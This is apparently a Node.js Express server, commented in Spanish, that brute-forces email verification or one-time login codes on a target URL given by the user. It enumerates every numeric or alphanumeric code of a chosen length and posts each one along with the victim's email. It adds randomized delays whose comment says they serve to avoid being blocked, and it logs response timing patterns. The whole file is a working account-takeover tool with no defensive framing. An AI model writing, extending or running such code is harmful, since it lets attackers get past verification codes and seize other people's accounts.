// server.js
const express = require('express');
const axios = require('axios');
const { performance } = require('perf_hooks');
const app = express();
const PORT = 3000;

// Middleware para parsear JSON
app.use(express.json());
app.use(express.static('public'));

// Almacenamiento para estadísticas y patrones
const estadisticas = {
  intentosTotales: 0,
  exitos: 0,
  fallos: 0,
  patronesTiempo: new Map(),
  codigosExitosos: []
};

// Función para medir tiempo de respuesta y analizar patrones
async function probarCodigo(url, email, codigo, headersAdicionales = {}) {
  const startTime = performance.now();
  
  try {
    const response = await axios.post(url, {
      email: email,
      code: codigo
    }, {
      headers: {
        'Content-Type': 'application/json',
        ...headersAdicionales
      }
    });
    
    const endTime = performance.now();
    const tiempoRespuesta = endTime - startTime;
    
    // Analizar respuesta para detectar patrones
    const esExitoso = response.status === 200 || 
                     response.data.includes('éxito') || 
                     response.data.includes('bienvenido') ||
                     response.data.includes('acceso concedido');
    
    // Actualizar estadísticas
    estadisticas.intentosTotales++;
    if (esExitoso) {
      estadisticas.exitos++;
      estadisticas.codigosExitosos.push(codigo);
    } else {
      estadisticas.fallos++;
    }
    
    // Registrar patrones de tiempo
    const rangoTiempo = Math.round(tiempoRespuesta / 50) * 50; // Agrupar en rangos de 50ms
    const clavePatron = `${response.status}_${rangoTiempo}`;
    
    if (!estadisticas.patronesTiempo.has(clavePatron)) {
      estadisticas.patronesTiempo.set(clavePatron, []);
    }
    estadisticas.patronesTiempo.get(clavePatron).push({
      codigo,
      tiempo: tiempoRespuesta,
      exito: esExitoso
    });
    
    return {
      exito: esExitoso,
      tiempo: tiempoRespuesta,
      estado: response.status,
      respuesta: response.data
    };
  } catch (error) {
    const endTime = performance.now();
    const tiempoRespuesta = endTime - startTime;
    
    estadisticas.intentosTotales++;
    estadisticas.fallos++;
    
    return {
      exito: false,
      tiempo: tiempoRespuesta,
      estado: error.response ? error.response.status : 0,
      respuesta: error.message
    };
  }
}

// Función para generar posibles códigos
function generarPosiblesCodigos(tipo = 'numerico', longitud = 4) {
  const codigos = [];
  
  if (tipo === 'numerico') {
    // Generar todas las combinaciones numéricas de la longitud especificada
    function generarCombinacion(actual, longitudRestante) {
      if (longitudRestante === 0) {
        codigos.push(actual);
        return;
      }
      
      for (let i = 0; i <= 9; i++) {
        generarCombinacion(actual + i, longitudRestante - 1);
      }
    }
    
    generarCombinacion("", longitud);
  } else if (tipo === 'alfanumerico') {
    // Generar combinaciones alfanuméricas (simplificado)
    const caracteres = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    
    function generarCombinacion(actual, longitudRestante) {
      if (longitudRestante === 0) {
        codigos.push(actual);
        return;
      }
      
      for (let i = 0; i < caracteres.length; i++) {
        generarCombinacion(actual + caracteres[i], longitudRestante - 1);
      }
    }
    
    generarCombinacion("", longitud);
  }
  
  return codigos;
}

// API endpoint para iniciar el proceso de detección
app.post('/detectar', async (req, res) => {
  const { url, email, tipoCodigo, longitudCodigo, headersAdicionales } = req.body;
  
  if (!url || !email) {
    return res.status(400).json({ error: 'URL y email son requeridos' });
  }
  
  try {
    // Generar posibles códigos
    const posiblesCodigos = generarPosiblesCodigos(tipoCodigo || 'numerico', longitudCodigo || 4);
    
    // Iniciar el proceso de prueba
    let codigoEncontrado = null;
    let intentoActual = 0;
    const maxIntentos = posiblesCodigos.length;
    
    // Función recursiva para probar códigos
    async function probarSiguienteCodigo() {
      if (intentoActual >= maxIntentos || codigoEncontrado !== null) {
        return;
      }
      
      const codigo = posiblesCodigos[intentoActual];
      intentoActual++;
      
      console.log(`Probando código: ${codigo} (${intentoActual}/${maxIntentos})`);
      
      const resultado = await probarCodigo(url, email, codigo, headersAdicionales);
      
      if (resultado.exito) {
        codigoEncontrado = codigo;
        console.log(`¡Código encontrado! ${codigo}`);
      }
      
      // Esperar un poco antes del siguiente intento para evitar bloqueos
      await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
      
      // Continuar con el siguiente código
      return probarSiguienteCodigo();
    }
    
    // Iniciar el proceso
    await probarSiguienteCodigo();
    
    // Enviar resultado
    if (codigoEncontrado) {
      res.json({
        exito: true,
        codigo: codigoEncontrado,
        intentos: intentoActual,
        estadisticas: estadisticas
      });
    } else {
      res.json({
        exito: false,
        mensaje: 'No se pudo encontrar el código',
        intentos: intentoActual,
        estadisticas: estadisticas
      });
    }
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Error en el servidor: ' + error.message });
  }
});

// API endpoint para obtener estadísticas
app.get('/estadisticas', (req, res) => {
  res.json(estadisticas);
});

// API endpoint para analizar patrones de tiempo
app.get('/analizar-patrones', (req, res) => {
  const analisis = {};
  
  // Agrupar por rango de tiempo
  for (const [clave, valores] of estadisticas.patronesTiempo.entries()) {
    const [estado, rangoTiempo] = clave.split('_');
    const exitos = valores.filter(v => v.exito).length;
    const fallos = valores.filter(v => !v.exito).length;
    
    if (!analisis[rangoTiempo]) {
      analisis[rangoTiempo] = {
        exitos: 0,
        fallos: 0,
        total: 0
      };
    }
    
    analisis[rangoTiempo].exitos += exitos;
    analisis[rangoTiempo].fallos += fallos;
    analisis[rangoTiempo].total += valores.length;
  }
  
  // Calcular tasas de éxito
  for (const rango in analisis) {
    analisis[rango].tasaExito = analisis[rango].exitos / analisis[rango].total;
  }
  
  res.json(analisis);
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`Servidor escuchando en http://localhost:${PORT}`);
});
